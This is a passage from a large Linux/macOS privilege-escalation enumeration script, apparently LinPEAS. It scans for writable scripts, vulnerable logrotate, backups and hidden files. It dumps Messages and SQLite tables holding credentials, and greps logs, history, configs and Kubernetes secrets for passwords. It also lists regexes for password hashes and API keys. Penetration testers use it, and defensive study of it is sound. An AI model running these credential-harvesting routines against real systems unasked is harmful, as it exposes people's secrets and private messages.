  5156	        elif echo "$entry" | grep -Eq "$writeVB"; then
  5157	          echo "$entry" | sed -${E} "s,$writeVB,${SED_RED_YELLOW},"
  5158	        else
  5159	          echo "$entry" | sed -${E} "s,$writeB,${SED_RED},"
  5160	        fi
  5161	      done
  5162	    fi
  5163	  done
  5164	  echo ""
  5165	fi
  5166	fi
  5167	echo ''
  5168	echo ''
  5169	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  5170	
  5171	if echo $CHECKS | grep -q interesting_files; then
  5172	print_title "Other Interesting Files"
  5173	###########################################
  5174	#----------) Interesting files (----------#
  5175	###########################################
  5176	
  5177	
  5178	##-- IF) .sh files in PATH
  5179	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5180	  print_2title ".sh files in path"
  5181	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path"
  5182	  echo $PATH | tr ":" "\n" | while read d; do
  5183	    for f in $(find "$d" -name "*.sh" -o -name "*.sh.*" 2>/dev/null); do
  5184	      if ! [ "$IAMROOT" ] && [ -O "$f" ]; then
  5185	        echo "You own the script: $f" | sed -${E} "s,.*,${SED_RED},"
  5186	      elif ! [ "$IAMROOT" ] && [ -w "$f" ]; then #If write permision, win found (no check exploits)
  5187	        echo "You can write script: $f" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  5188	      else
  5189	        echo $f | sed -${E} "s,$shscripsG,${SED_GREEN}," | sed -${E} "s,$Wfolders,${SED_RED},";
  5190	      fi
  5191	    done
  5192	  done
  5193	  echo ""
  5194	
  5195	  broken_links=$(find "$d" -type l 2>/dev/null | xargs file 2>/dev/null | grep broken)
  5196	  if [ "$broken_links" ] || [ "$DEBUG" ]; then 
  5197	    print_2title "Broken links in path"
  5198	    echo $PATH | tr ":" "\n" | while read d; do
  5199	      find "$d" -type l 2>/dev/null | xargs file 2>/dev/null | grep broken | sed -${E} "s,broken,${SED_RED},";
  5200	    done
  5201	    echo ""
  5202	  fi
  5203	fi
  5204	
  5205	##-- IF) Date times inside firmware
  5206	if [ "$SEARCH_IN_FOLDER" ]; then
  5207	  print_2title "Files datetimes inside the firmware (limit 50)"
  5208	  find "$SEARCH_IN_FOLDER" -type f -printf "%T+\n" 2>/dev/null | sort | uniq -c | sort | head -n 50
  5209	  echo "To find a file with an specific date execute: find \"$SEARCH_IN_FOLDER\" -type f -printf \"%T+ %p\n\" 2>/dev/null | grep \"<date>\""
  5210	  echo ""
  5211	fi
  5212	
  5213	##-- IF) Executable files added by user
  5214	print_2title "Executable files potentially added by user (limit 70)"
  5215	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5216	  find / -type f -executable -printf "%T+ %p\n" 2>/dev/null | grep -Ev "000|/site-packages|/python|/node_modules|\.sample|/gems|/cgroup/" | sort -r | head -n 70
  5217	else
  5218	  find "$SEARCH_IN_FOLDER" -type f -executable -printf "%T+ %p\n" 2>/dev/null | grep -Ev "/site-packages|/python|/node_modules|\.sample|/gems|/cgroup/" | sort -r | head -n 70
  5219	fi
  5220	echo ""
  5221	
  5222	
  5223	
  5224	if [ "$MACPEAS" ]; then
  5225	  print_2title "Unsigned Applications"
  5226	  macosNotSigned /System/Applications
  5227	fi
  5228	
  5229	##-- IF) Unexpected in /opt
  5230	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5231	  if [ "$(ls /opt 2>/dev/null)" ]; then
  5232	    print_2title "Unexpected in /opt (usually empty)"
  5233	    ls -la /opt
  5234	    echo ""
  5235	  fi
  5236	fi
  5237	
  5238	##-- IF) Unexpected folders in /
  5239	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5240	  print_2title "Unexpected in root"
  5241	  if [ "$MACPEAS" ]; then
  5242	    (find $ROOT_FOLDER -maxdepth 1 | grep -Ev "$commonrootdirsMacG" | sed -${E} "s,.*,${SED_RED},") || echo_not_found
  5243	  else
  5244	    (find $ROOT_FOLDER -maxdepth 1 | grep -Ev "$commonrootdirsG" | sed -${E} "s,.*,${SED_RED},") || echo_not_found
  5245	  fi
  5246	  echo ""
  5247	fi
  5248	
  5249	##-- IF) Modified interesting files into specific folders in the last 5mins
  5250	print_2title "Modified interesting files in the last 5mins (limit 100)"
  5251	find $ROOT_FOLDER -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" ! -path "/private/var/*" 2>/dev/null | grep -v "/linpeas" | head -n 100 | sed -${E} "s,$Wfolders,${SED_RED},"
  5252	echo ""
  5253	
  5254	##-- IF) Writable log files
  5255	if command -v logrotate >/dev/null && logrotate --version | head -n 1 | grep -Eq "[012]\.[0-9]+\.|3\.[0-9]\.|3\.1[0-7]\.|3\.18\.0"; then #3.18.0 and below
  5256	print_2title "Writable log files (logrotten) (limit 50)"
  5257	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation"
  5258	  logrotate --version 2>/dev/null || echo_not_found "logrotate"
  5259	  lastWlogFolder="ImPOsSiBleeElastWlogFolder"
  5260	  logfind=$(find $ROOT_FOLDER -type f -name "*.log" -o -name "*.log.*" 2>/dev/null | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 3){ print line_init; }; if (cont == "3"){print "#)You_can_write_more_log_files_inside_last_directory"}; pre=act}' | head -n 50)
  5261	  printf "%s\n" "$logfind" | while read log; do
  5262	    if ! [ "$IAMROOT" ] && [ "$log" ] && [ -w "$log" ] || ! [ "$IAMROOT" ] && echo "$log" | grep -qE "$Wfolders"; then #Only print info if something interesting found
  5263	      if echo "$log" | grep -q "You_can_write_more_log_files_inside_last_directory"; then printf $ITALIC"$log\n"$NC;
  5264	      elif ! [ "$IAMROOT" ] && [ -w "$log" ] && [ "$(command -v logrotate 2>/dev/null)" ] && logrotate --version 2>&1 | grep -qE ' 1| 2| 3.1'; then printf "Writable:$RED $log\n"$NC; #Check vuln version of logrotate is used and print red in that case
  5265	      elif ! [ "$IAMROOT" ] && [ -w "$log" ]; then echo "Writable: $log";
  5266	      elif ! [ "$IAMROOT" ] && echo "$log" | grep -qE "$Wfolders" && [ "$log" ] && [ ! "$lastWlogFolder" == "$log" ]; then lastWlogFolder="$log"; echo "Writable folder: $log" | sed -${E} "s,$Wfolders,${SED_RED},g";
  5267	      fi
  5268	    fi
  5269	  done
  5270	fi
  5271	
  5272	echo ""
  5273	
  5274	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5275	  ##-- IF) Files inside my home
  5276	  print_2title "Files inside $HOME (limit 20)"
  5277	  (ls -la $HOME 2>/dev/null | head -n 23) || echo_not_found
  5278	  echo ""
  5279	
  5280	  ##-- IF) Files inside /home
  5281	  print_2title "Files inside others home (limit 20)"
  5282	  (find $HOMESEARCH -type f 2>/dev/null | grep -v -i "/"$USER | head -n 20) || echo_not_found
  5283	  echo ""
  5284	
  5285	  ##-- IF) Mail applications
  5286	  print_2title "Searching installed mail applications"
  5287	  ls /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /etc 2>/dev/null | grep -Ewi "$mail_apps" | sort | uniq
  5288	  echo ""
  5289	
  5290	  ##-- IF) Mails
  5291	  print_2title "Mails (limit 50)"
  5292	  (find /var/mail/ /var/spool/mail/ /private/var/mail -type f -ls 2>/dev/null | head -n 50 | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_GREEN},g" | sed "s,$USER,${SED_RED},g") || echo_not_found
  5293	  echo ""
  5294	
  5295	  ##-- IF) Backup folders
  5296	  if [ "$backup_folders" ] || [ "$DEBUG" ]; then
  5297	    print_2title "Backup folders"
  5298	    printf "%s\n" "$backup_folders" | while read b ; do
  5299	      ls -ld "$b" 2> /dev/null | sed -${E} "s,backups|backup,${SED_RED},g";
  5300	      ls -l "$b" 2>/dev/null && echo ""
  5301	    done
  5302	    echo ""
  5303	  fi
  5304	fi
  5305	
  5306	##-- IF) Backup files
  5307	print_2title "Backup files (limited 100)"
  5308	backs=$(find $ROOT_FOLDER -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bak\.*" -o -name "*\.bck" -o -name "*\.bck\.*" -o -name "*\.bk" -o -name "*\.bk\.*" -o -name "*\.old" -o -name "*\.old\.*" \) -not -path "/proc/*" 2>/dev/null)
  5309	printf "%s\n" "$backs" | head -n 100 | while read b ; do
  5310	  if [ -r "$b" ]; then
  5311	    ls -l "$b" | grep -Ev "$notBackup" | grep -Ev "$notExtensions" | sed -${E} "s,backup|bck|\.bak|\.old,${SED_RED},g";
  5312	  fi;
  5313	done
  5314	echo ""
  5315	
  5316	##-- IF) DB files
  5317	if [ "$MACPEAS" ]; then
  5318	  print_2title "Reading messages database"
  5319	  sqlite3 $HOME/Library/Messages/chat.db 'select * from message' 2>/dev/null
  5320	  sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment' 2>/dev/null
  5321	  sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages' 2>/dev/null
  5322	
  5323	fi
  5324	
  5325	
  5326	if [ "$PSTORAGE_DATABASE" ] || [ "$DEBUG" ]; then
  5327	  print_2title "Searching tables inside readable .db/.sql/.sqlite files (limit 100)"
  5328	  FILECMD="$(command -v file 2>/dev/null)"
  5329	  printf "%s\n" "$PSTORAGE_DATABASE" | while read f; do
  5330	    if [ "$FILECMD" ]; then
  5331	      echo "Found "$(file "$f") | sed -${E} "s,\.db|\.sql|\.sqlite|\.sqlite3,${SED_RED},g";
  5332	    else
  5333	      echo "Found $f" | sed -${E} "s,\.db|\.sql|\.sqlite|\.sqlite3,${SED_RED},g";
  5334	    fi
  5335	  done
  5336	  SQLITEPYTHON=""
  5337	  echo ""
  5338	  printf "%s\n" "$PSTORAGE_DATABASE" | while read f; do
  5339	    if ([ -r "$f" ] && [ "$FILECMD" ] && file "$f" | grep -qi sqlite) || ([ -r "$f" ] && [ ! "$FILECMD" ]); then #If readable and filecmd and sqlite, or readable and not filecmd
  5340	      if [ "$(command -v sqlite3 2>/dev/null)" ]; then
  5341	        tables=$(sqlite3 $f ".tables" 2>/dev/null)
  5342	        #printf "$tables\n" | sed "s,user.*\|credential.*,${SED_RED},g"
  5343	      elif [ "$(command -v python 2>/dev/null)" ] || [ "$(command -v python3 2>/dev/null)" ]; then
  5344	        SQLITEPYTHON=$(command -v python 2>/dev/null || command -v python3 2>/dev/null)
  5345	        tables=$($SQLITEPYTHON -c "print('\n'.join([t[0] for t in __import__('sqlite3').connect('$f').cursor().execute('SELECT name FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\';').fetchall()]))" 2>/dev/null)
  5346	        #printf "$tables\n" | sed "s,user.*\|credential.*,${SED_RED},g"
  5347	      else
  5348	        tables=""
  5349	      fi
  5350	      if [ "$tables" ] || [ "$DEBUG" ]; then
  5351	          printf $GREEN" -> Extracting tables from$NC $f $DG(limit 20)\n"$NC
  5352	          printf "%s\n" "$tables" | while read t; do
  5353	          columns=""
  5354	          # Search for credentials inside the table using sqlite3
  5355	          if [ -z "$SQLITEPYTHON" ]; then
  5356	            columns=$(sqlite3 $f ".schema $t" 2>/dev/null | grep "CREATE TABLE")
  5357	          # Search for credentials inside the table using python
  5358	          else
  5359	            columns=$($SQLITEPYTHON -c "print(__import__('sqlite3').connect('$f').cursor().execute('SELECT sql FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name =\'$t\';').fetchall()[0][0])" 2>/dev/null)
  5360	          fi
  5361	          #Check found columns for interesting fields
  5362	          INTCOLUMN=$(echo "$columns" | grep -i "username\|passw\|credential\|email\|hash\|salt")
  5363	          if [ "$INTCOLUMN" ]; then
  5364	            printf ${BLUE}"  --> Found interesting column names in$NC $t $DG(output limit 10)\n"$NC | sed -${E} "s,user.*|credential.*,${SED_RED},g"
  5365	            printf "$columns\n" | sed -${E} "s,username|passw|credential|email|hash|salt|$t,${SED_RED},g"
  5366	            (sqlite3 $f "select * from $t" || $SQLITEPYTHON -c "print(', '.join([str(x) for x in __import__('sqlite3').connect('$f').cursor().execute('SELECT * FROM \'$t\';').fetchall()[0]]))") 2>/dev/null | head
  5367	            echo ""
  5368	          fi
  5369	        done
  5370	      fi
  5371	    fi
  5372	  done
  5373	fi
  5374	echo ""
  5375	
  5376	if [ "$MACPEAS" ]; then
  5377	  print_2title "Downloaded Files"
  5378	  sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 'select LSQuarantineAgentName, LSQuarantineDataURLString, LSQuarantineOriginURLString, date(LSQuarantineTimeStamp + 978307200, "unixepoch") as downloadedDate from LSQuarantineEvent order by LSQuarantineTimeStamp' | sort | grep -Ev "\|\|\|"
  5379	fi
  5380	
  5381	##-- IF) Web files
  5382	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5383	  print_2title "Web files?(output limit)"
  5384	  ls -alhR /var/www/ 2>/dev/null | head
  5385	  ls -alhR /srv/www/htdocs/ 2>/dev/null | head
  5386	  ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head
  5387	  ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head
  5388	  echo ""
  5389	fi
  5390	
  5391	##-- IF) All hidden files
  5392	print_2title "All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)"
  5393	find $ROOT_FOLDER -type f -iname ".*" ! -path "/sys/*" ! -path "/System/*" ! -path "/private/var/*" -exec ls -l {} \; 2>/dev/null | grep -Ev "$INT_HIDDEN_FILES" | grep -Ev "_history$|\.gitignore|.npmignore|\.listing|\.ignore|\.uuid|\.depend|\.placeholder|\.gitkeep|\.keep|\.keepme|\.travis.yml" | head -n 70
  5394	echo ""
  5395	
  5396	##-- IF) Readable files in /tmp, /var/tmp, backups
  5397	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5398	  print_2title "Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)"
  5399	  filstmpback=$(find /tmp /var/tmp /private/tmp /private/var/at/tmp /private/var/tmp $backup_folders_row -type f 2>/dev/null | grep -Ev "dpkg\.statoverride\.|dpkg\.status\.|apt\.extended_states\.|dpkg\.diversions\." | head -n 70)
  5400	  printf "%s\n" "$filstmpback" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null; fi; done
  5401	  echo ""
  5402	fi
  5403	
  5404	##-- IF) Passwords in history cmd
  5405	if [ "$(history 2>/dev/null)" ] || [ "$DEBUG" ]; then
  5406	  print_2title "Searching passwords in history cmd"
  5407	  history | grep -Ei "$pwd_inside_history" "$f" 2>/dev/null | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  5408	  echo ""
  5409	fi
  5410	
  5411	##-- IF) Passwords in history files
  5412	if [ "$PSTORAGE_HISTORY" ] || [ "$DEBUG" ]; then
  5413	  print_2title "Searching passwords in history files"
  5414	  printf "%s\n" "$PSTORAGE_HISTORY" | while read f; do grep -Ei "$pwd_inside_history" "$f" 2>/dev/null | sed -${E} "s,$pwd_inside_history,${SED_RED},"; done
  5415	  echo ""
  5416	fi
  5417	
  5418	##-- IF) Passwords in config PHP files
  5419	if [ "$PSTORAGE_PHP_FILES" ] || [ "$DEBUG" ]; then
  5420	  print_2title "Searching passwords in config PHP files"
  5421	  printf "%s\n" "$PSTORAGE_PHP_FILES" | while read c; do grep -EiI "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" "$c" 2>/dev/null | grep -Ev "function|password.*= ?\"\"|password.*= ?''" | sed '/^.\{150\}./d' | sort | uniq | sed -${E} "s,[pP][aA][sS][sS][wW]|[dD][bB]_[pP][aA][sS][sS],${SED_RED},g"; done
  5422	  echo ""
  5423	fi
  5424	
  5425	##-- IF) Passwords files in home
  5426	if [ "$PSTORAGE_PASSWORD_FILES" ] || [ "$DEBUG" ]; then
  5427	  print_2title "Searching *password* or *credential* files in home (limit 70)"
  5428	  (printf "%s\n" "$PSTORAGE_PASSWORD_FILES" | grep -v "/snap/" | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 3){ print line_init; } if (cont == "3"){print "  #)There are more creds/passwds files in the previous parent folder\n"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n 70 | sed -${E} "s,password|credential,${SED_RED}," | sed "s,There are more creds/passwds files in the previous parent folder,${C}[3m&${C}[0m,") || echo_not_found
  5429	  echo ""
  5430	fi
  5431	
  5432	##-- IF) TTY passwords
  5433	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5434	  print_2title "Checking for TTY (sudo/su) passwords in audit logs"
  5435	  aureport --tty 2>/dev/null | grep -E "su |sudo " | sed -${E} "s,su|sudo,${SED_RED},g"
  5436	  find /var/log/ -type f -exec grep -RE 'comm="su"|comm="sudo"' '{}' \; 2>/dev/null | sed -${E} "s,\"su\"|\"sudo\",${SED_RED},g" | sed -${E} "s,data=.*,${SED_RED},g"
  5437	  echo ""
  5438	fi
  5439	
  5440	##-- IF) IPs inside logs
  5441	if [ "$DEBUG" ] || ( ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && ! [ "$SEARCH_IN_FOLDER" ] ); then
  5442	  print_2title "Searching IPs inside logs (limit 70)"
  5443	  (find /var/log/ /var/logs /private/var/log -type f -exec grep -R -a -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" "{}" \;) 2>/dev/null | grep -v "\.0\.\|:0\|\.0$" | sort | uniq -c | sort -r -n | head -n 70
  5444	  echo ""
  5445	fi
  5446	
  5447	##-- IF) Passwords inside logs
  5448	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5449	  print_2title "Searching passwords inside logs (limit 70)"
  5450	  (find /var/log/ /var/logs/ /private/var/log -type f -exec grep -R -i "pwd\|passw" "{}" \;) 2>/dev/null | sed '/^.\{150\}./d' | sort | uniq | grep -v "File does not exist:\|modules-config/config-set-passwords\|config-set-passwords already ran\|script not found or unable to stat:\|\"GET /.*\" 404" | head -n 70 | sed -${E} "s,pwd|passw,${SED_RED},"
  5451	  echo ""
  5452	fi
  5453	
  5454	if [ "$DEBUG" ] || ( ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && ! [ "$SEARCH_IN_FOLDER" ] ); then
  5455	  ##-- IF) Emails inside logs
  5456	  print_2title "Searching emails inside logs (limit 70)"
  5457	  (find /var/log/ /var/logs/ /private/var/log -type f -exec grep -I -R -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" "{}" \;) 2>/dev/null | sort | uniq -c | sort -r -n | head -n 70 | sed -${E} "s,$knw_emails,${SED_GREEN},g"
  5458	  echo ""
  5459	fi
  5460	
  5461	if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
  5462	  ##-- IF) Find possible files with passwords
  5463	  print_2title "Searching possible password variables inside key folders (limit 140)"
  5464	  if ! [ "$SEARCH_IN_FOLDER" ]; then
  5465	    timeout 150 find $HOMESEARCH -exec grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
  5466	    timeout 150 find /var/www $backup_folders_row /tmp /etc /mnt /private grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
  5467	  else
  5468	    timeout 150 find $SEARCH_IN_FOLDER -exec grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
  5469	  fi
  5470	  wait
  5471	  echo ""
  5472	
  5473	  ##-- IF) Find possible conf files with passwords
  5474	  print_2title "Searching possible password in config files (if k8s secrets are found you need to read the file)"
  5475	  if ! [ "$SEARCH_IN_FOLDER" ]; then
  5476	    ppicf=$(timeout 150 find $HOMESEARCH /var/www/ /usr/local/www/ /etc /opt /tmp /private /Applications /mnt -name "*.conf" -o -name "*.cnf" -o -name "*.config" -name "*.json" -name "*.yml" -name "*.yaml" 2>/dev/null)
  5477	  else
  5478	    ppicf=$(timeout 150 find $SEARCH_IN_FOLDER -name "*.conf" -o -name "*.cnf" -o -name "*.config" -name "*.json" -name "*.yml" -name "*.yaml" 2>/dev/null)
  5479	  fi
  5480	  printf "%s\n" "$ppicf" | while read f; do
  5481	    if grep -qEiI 'passwd.*|creden.*|^kind:\W?Secret|\Wenv:|\Wsecret:|\WsecretName:|^kind:\W?EncryptionConfiguration|\-\-encriyption\-provider\-config' \"$f\" 2>/dev/null; then
  5482	      echo "$ITALIC $f$NC"
  5483	      grep -HnEiIo 'passwd.*|creden.*|^kind:\W?Secret|\Wenv:|\Wsecret:|\WsecretName:|^kind:\W?EncryptionConfiguration|\-\-encriyption\-provider\-config' "$f" 2>/dev/null | sed -${E} "s,[pP][aA][sS][sS][wW]|[cC][rR][eE][dD][eE][nN],${SED_RED},g"
  5484	    fi
  5485	  done
  5486	  echo ""
  5487	fi
  5488	
  5489	fi
  5490	echo ''
  5491	echo ''
  5492	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  5493	
  5494	if echo $CHECKS | grep -q api_keys_regex; then
  5495	print_title "API Keys Regex"
  5496	
  5497	search_for_regex(){
  5498	    title=$1
  5499	    regex=$2
  5500	    caseSensitive=$3
  5501	    
  5502	    if [ "$caseSensitive" ]; then
  5503	        i="i"
  5504	    else
  5505	        i=""
  5506	    fi
  5507	
  5508	    print_3title_no_nl "Searching $title..."
  5509	
  5510	    if [ "$SEARCH_IN_FOLDER" ]; then
  5511	        timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  5512	    else
  5513	        # Search in home direcoties (usually the slowest)
  5514	        timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  5515	        
  5516	        # Search in etc
  5517	        timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  5518	        
  5519	        # Search in opt
  5520	        timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  5521	        
  5522	        # Search in possible web folders (usually only 1 will exist)
  5523	        timeout 120 find /var/www /usr/local/www /usr/share/nginx /Library/WebServer/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  5524	        
  5525	        # Search in logs
  5526	        timeout 120 find /var/log /var/logs /Library/Logs -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  5527	        
  5528	        # Search in backups
  5529	        timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  5530	        
  5531	        # Search in others folders (usually only /srv or /Applications will exist)
  5532	        timeout 120 find /tmp /srv /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  5533	    fi
  5534	    wait
  5535	    printf "\033[2K\r"
  5536	}
  5537	
  5538	
  5539	
  5540	if [ "$REGEXES" ] && [ "$TIMEOUT" ]; then
  5541	        print_2title "Searching Hashed Passwords"
  5542	    search_for_regex "Apr1 MD5" "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" 
  5543	    search_for_regex "Apache SHA" "\{SHA\}[0-9a-zA-Z/_=]{10,}" 
  5544	    search_for_regex "Blowfish" "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" 
  5545	    search_for_regex "Drupal" "\$S\$[a-zA-Z0-9_/\.]{52}" 
  5546	    search_for_regex "Joomlavbulletin" "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" 
  5547	    search_for_regex "Linux MD5" "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" 
  5548	    search_for_regex "phpbb3" "\$H\$[a-zA-Z0-9_/\.]{31}" 
  5549	    search_for_regex "sha512crypt" "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" 
  5550	    search_for_regex "Wordpress" "\$P\$[a-zA-Z0-9_/\.]{31}" 
  5551	    echo ''
  5552	
  5553	    print_2title "Searching Raw Hashes"
  5554	    search_for_regex "sha512" "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" 
  5555	    echo ''
  5556	
  5557	    print_2title "Searching APIs"
  5558	    search_for_regex "Adobe Client Id (Oauth Web)" "(adobe[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-f0-9]{32})['\"]" 1
  5559	    search_for_regex "Abode Client Secret" "(p8e-)[a-z0-9]{32}" 1
  5560	    search_for_regex "Age Secret Key" "AGE-SECRET-KEY-1[QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7L]{58}" 
  5561	    search_for_regex "Alchemi API Key" "(alchemi[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9-]{32})['\"]" 1
  5562	    search_for_regex "Alibaba Access Key ID" "(LTAI)[a-z0-9]{20}" 1
  5563	    search_for_regex "Alibaba Secret Key" "(alibaba[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{30})['\"]" 1
  5564	    search_for_regex "Artifactory API Key & Password" "[\"']AKC[a-zA-Z0-9]{10,}[\"']|[\"']AP[0-9ABCDEF][a-zA-Z0-9]{8,}[\"']" 
  5565	    search_for_regex "Asana Client ID" "((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9]{16})['\"])|((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"])" 1
